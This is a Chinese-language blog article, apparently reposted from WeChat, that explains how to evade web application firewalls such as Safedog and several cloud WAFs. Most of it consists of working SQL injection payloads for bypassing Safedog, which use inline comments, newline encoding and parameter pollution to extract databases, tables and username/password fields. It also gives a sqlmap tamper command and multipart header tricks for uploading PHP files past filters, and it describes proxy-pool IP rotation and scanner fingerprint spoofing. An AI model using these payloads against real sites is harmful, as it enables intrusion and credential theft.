\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/\_zNfc2E-Mf7wXodFHYKklQ)

**一、网站防护分类**
------------

**1.源码防护：**

使用过滤函数对恶意攻击进行过滤，绕过思路：  
①大小写替换  
②变换提交方式：如get请求变post/cookie请求绕过  
③编码绕过：url编码、基于语句重叠、注释符等

**2.软件WAF：**  
通过访问速度、指纹识别等特征进行拦截；常见软件WAF如安全狗、D盾、云锁、云盾等，软件WAF侧重拦截web漏洞。通过访问阈值的大小判断为CC攻击，进行IP封锁；

**3.硬件WAF：**  
主要防御流量和部分web攻击。常见硬件WAF如天融信、深信服等厂商的防火墙。硬件WAF基于TCP三次握手封锁真实IP；

**4.云WAF：**

阿里云等

* * *

  

**二、 WAF拦截方向**
--------------

**1.基于IP封锁**

①基于HTTP请求头封锁IP  
使用burp suite插件fake-ip进行绕过

```
`client-ip:1.1.1.1``x-forward-for:1.1.1.1`
```

  

②基于TCP请求封锁IP

使用IP代理池不断切换真实IP

  

**2.指纹识别-修改扫描工具特有指纹**  

每个扫描工具都有特定的指纹，这里说的指纹是指http请求头里面的User-Agent。WAF一旦识别到工具的指纹会直接封锁请求IP，所以在进行攻击时需要修改指纹欺骗WAF，不同工具的修改方式不同，具体百度：

DirBuster：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

sqlmap：注入时添加–radom-agent参数，也可以使用–User-Agent="xx”参数指定指纹进行注入攻击  

  

**3.访问速度和web攻击**  
waf存在访问阈值，如果单个IP访问速度过快会被waf当作ddos或者cc攻击从而进行拦截。另外基于web层面的攻击也会被拦截，例如：在web页面进入sql注入或者xss的payload会被waf拦截关键字，进行文件上传时会检测上传文件后缀和文件内容等…

  

**4.总结**  
从IP封锁、访问速度、指纹信息以及web攻击等多个维度进行bypass。

* * *

  

**三、目录扫描**

**1.子域名查找**  
子域名查询利用第三方接口查询。避免waf拦截  
①shodan、fofa  
②谷歌语法  
③其他接口

```
`http://z.zcjun.com/``https://phpinfo.me/domain/``https://d.chinacycc.com/index.php?m=Login&a=index`
```

**2.目录扫描**

使用代理池：ProxyPool-mater

```
项目地址：https://github.com/Python3WebSpider/ProxyPool
```

①本地安装redis，安装教程：

```
https://www.runoob.com/redis/redis-install.html
```

```


  



```

②运行代理池脚本，抓取代理IP并筛选然后存放到redis库里面：

```
`#开启redis服务``cd ./redis``redis-server redis.windows.conf``#运行脚本ProxyPool-master``cd ./ProxyPool-master``python run.py`
```

  

③运行成功后会在本机开放一个接口从而获取redis库里面的IP，并随机切换：

```
接口地址：127.0.0.1:5555/random
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

④然后利用网站目录扫描脚本调用此IP进行目录扫描，脚本实现方式：  

*   加载同级目录字典进行扫描
    

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

*   调用本地接口获取代理IP
    

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

*   运行脚本，成功bypass
    

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

ps：sqlmap使用代理池IP：将IP保存在1.txt里面，使用–proxy-file="c:\\1.txt"参数进行代理IP切换

* * *

  

**四、手工注入**
----------

**1.参数污染**

①注释、空字符、内联注释、脏数据、单行注释、换行符等污染

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```
access+asp空格：  %0a %0d %09 %20 + 
```

  

②长度污染：waf拦截长度有一定的限制，一般用与post提交的时候，使用垃圾字符提交内容导致内存溢出：

```
`%%&%%%%%%%%%%%%%%%%%%%%%%%%%%0a``id=1&id=1&id=1&id=1&id=1&id=1&id=1 and 1=1`
```

```
  

```

③变换提交方式（服务器支持post、cookie传参）

*   直接get提交被安全狗拦截：
    

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

*   变换为post提交方式成功bypass：
    

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

**2.实例：六条语句bypass安全狗**

环境：安全狗4.0 IIS版本+mysql 5.4+IIS 7.5

**第一种：特殊数字+内敛注释**

```
`#在1-55000之间找特殊数字，这个数字表示数据库版本。数据库是4.45.09以上版本该语句才会被执行``id=-1%20union%20/*!44509select*/%201,2,3%23``id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

ps：我发现在这个区间只要带44的数字都不拦截，不知道这是不是一枚彩蛋。

```
`#找数字列``showproducts.php?id=-13/*!10444union*//*!10444%23*/%0a/*!10444select*/1,2,3,4,5,6,7,8,9,10``#数据库名``showproducts.php?id=-13/*!10444union*//*!10444%23*/%0a/*!10444select*/1,database%23%0a(),3,4,5,6,7,8,9,10`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#表名``showproducts.php?id=-13/*!10444union*//*!10444%23*/%0a/*!10444select*/1,group_concat(table_name),3,4,5,6,7,8,9,10 from information_schema.tables where table_schema=0x7879636d73`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段名``showproducts.php?id=-13/*!10444union*//*!10444%23*/%0a/*!10444select*/1,group_concat(column_name),3,4,5,6,7,8,9,10 from information_schema.columns where table_name=0x6d616e6167655f75736572`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段内容``showproducts.php?id=-13/*!10444union*//*!10444%23*/%0a/*!10444select*/1,group_concat(m_name,m_pwd),3,4,5,6,7,8,9,10 from manage_user`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

### **第二种union/_%00_/%23a%0A/_!/_!select 1,2,3\*/;%23**

```
`#字段数``?id=1/*%00*/%23a%0A/*!/*!order*/+/*%00*/%23a%0A/*!/*!by+3*/--+`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#数字列``?id=-1 union/*%00*/%23a%0A/*!/*!select 1,2,3*/;%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

```
`#数据库``?id=-1+union/*%00*/%23a%0A/*!/*!select 1,database%23%0a(),3*/;%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#表名``?id=-1+union/*%00*/%23a%0A/*!/*!select*/1,group_concat(%23%0atable_name),3 from information_schema.tables where table_schema=0x7365637572697479;%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段名``?id=-1+union/*%00*/%23a%0A/*!/*!select*/1,group_concat(%23%0acolumn_name),3 from information_schema.columns where table_name=0x7573657273;%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#字段内容``?id=-1+union/*%00*/%23a%0A/*!/*!select*/1,group_concat(%23%0a0x7E,username,password),3 from security.users;%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

### **第三种：/\*\*&id=-1%20union%20select%201,2,3%23\*/**

  

```
`#字段数：``?id=1/**&id=1%20order by 3%23*/`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#数据库名``?id=1/**&id=-1%20union%20select%201,database(),3%23*/`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#表名``?id=1/**&id=-1%20union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479%23*/`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段名``?id=1/**&id=-1%20union%20select%201,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273%23*/`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#字段内容``?id=1/**&id=-1%20union%20select%201,group_concat(0x7e,username,password),3 from users%23*/`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

  

```
`#字段数``?id=1%20order%20%23%0a%20by%203%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#数据库``?id=-1%20union%20all%23%0a%20select%201,database%23%0a(),3%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#表名``?id=-1%20union%20all%23%0a%20select%201,group_concat(%23%0atable_name),3 from information_schema.tables where table_schema=0x7365637572697479%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段名``?id=-1%20union%20all%23%0a%20select%201,group_concat(%23%0acolumn_name),3 from information_schema.columns where table_name=0x7573657273%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

```
`#字段内容``?id=-1%20union%20all%23%0a%20select%201,group_concat(%23%0a0x7e,username,password),3 from users%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

  

### **第五种：字符型**

– - 是mysql的注释符 然后加上%0a 换行。安全狗正则匹配order by,union select。并不单纯匹配某一个单词函数-- -a%0a

```
`#字段数``?id=1 order -- -a%0a by 3%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

```
`#数据库``?id=-1 union-- -a%0a select 1,database-- -a%0a(),3%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#表名``?id=-1 union-- -a%0a select 1,group_concat(-- -a%0atable_name),3 from information_schema.tables where table_schema=0x7365637572697479%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

```
`#字段名``?id=-1 union-- -a%0a select 1,group_concat(-- -a%0acolumn_name),3 from information_schema.columns where table_name=0x7573657273%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

```
`#字段内容``?id=-1 union-- -a%0a select 1,group_concat(-- -a%0a0x7e,username,password),3 from users%23`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

  

### **第六种：**

贴图太累了，放弃

```
`#数据库``?id=\Nunion/*!14444select*/1,database(%23%0a),3`
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

###   

### **3\. tamper编写**  

可以对已经存在的tamper加上上面的payload进行魔改，例如：在tamper versionedmorekeywords.py里面进行替换：

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

替换完成后使用该tamper就可以过狗了：

```
sqlmap -u "http://192.168.198.129:86/Less-2/?id=1" --tamper=safedog.py --ramdom-agent --delay=0.5 
```

* * *

  

**文件上传**

环境同上。

**①截断  
**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**②去掉引号**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**③引号**  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

引号2

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

引号3

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**④filename**

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

filename2

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

**⑤换行**  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

换行2

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

**上传绕过思路**  

1.对文件的内容，数据。数据包进行处理。

```
`Content-Disposition: form-data;` `# 将form-data;修改为~form-data，即：``Content-Disposition: ~form-data;` 
```

  

2.通过替换大小写来进行绕过

```
`Content-Disposition: form-data;` `Content-Type: application/octet-stream``#将Content-Disposition修改为content-Disposition``Content-Disposition: form-data;` `#将form-data修改为Form-data``Content-Disposition: Form-data;` `#将Content-Type修改为content-Type``content-Type: application/octet-stream`
```

  

3.通过删减空格来进行绕过

```
`Content-Disposition: form-data;` `Content-Type: application/octet-stream``将Content-Disposition: form-data //冒号后面 增加或减少一个空格``将form-data; ;   //分号后面 增加或减少一个空格``将Content-Type: application/octet-stream //冒号后面 增加一个空格`
```

  

4.通过字符串拼接绕过

```
`看Content-Disposition: form-data;` `将 form-data 修改为   f+orm-data``将 from-data 修改为   form-d+ata`
```

  

5.双文件上传绕过

```
`<form action="https://www.xxx.com/xxx.asp(php)" method="post"``multipart/form‐data">``<input >``<input >``<input type="submit" >``</form>`
```

  

6.HTTP header 属性值绕过

```
`Content-Disposition: form-data;` `//通过替换form-data 为*来绕过``Content-Disposition: *;` 
```

  

7.HTTP header 属性名称绕过

```
`源代码:``Content-Disposition: form-data; Content-Type: image/png``绕过内容如下：``Content-Disposition: form-data; 085733uykwusqcs8vw8wky.png``C.php"``删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php".`
```

  

8.等效替换绕过

```
`原内容：``Content-Type: multipart/form-data; boundary=---------------------------471463142114``修改后:``Content-Type: multipart/form-data; boundary =---------------------------471463142114``boundary后面加入空格。`
```

  

9.修改编码绕过

```
使用UTF-16、Unicode、双URL编码等等
```

  

10.百度云上传绕过  

```
`Content-Disposition: form-data;` `或者：``filename='1.php(回车)'`
```

11.阿里云上传绕过

```
`源代码：``Content-Disposition: form-data; Content-Type: image/jpeg``修改如下：``Content-Disposition: form-data;` `将=号这里回车删除掉Content-Type: image/jpeg即可绕过。`
```

12.360主机上传绕过

```
`源代码:``Content-Disposition: form-data; Content-Type: image/png``绕过内容如下：``Content- Disposition: form-data; 085733uykwusqcs8vw8wky.png``Content-Disposition 修改为 Content-空格Disposition`
```

  

13.===绕过

```
Content- Disposition: form-data; 
```

  

14.云锁上传绕过

```
`Content- Disposition: form-data; 123.``11.php"`
```

  

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)